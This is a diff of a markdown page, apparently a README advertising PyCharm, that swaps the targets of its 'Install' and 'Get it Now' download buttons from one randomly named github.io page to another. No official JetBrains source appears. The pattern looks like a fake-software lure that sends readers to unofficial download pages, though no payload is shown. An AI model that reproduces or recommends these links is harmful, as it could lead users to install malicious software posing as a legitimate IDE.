@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://jjfhjfk3858.github.io/.github/pyCharm)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poke-pokemon.github.io/.github/pyCharm)
 
 </div>
 
@@ -81,7 +81,7 @@ PyCharm's intelligent completion for Python represents a genuinely different cap
 
 <p align="center">
 
-[![Get it Now PyCharm](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/pyCharm)
+[![Get it Now PyCharm](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.github/pyCharm)
 
 </p>
 
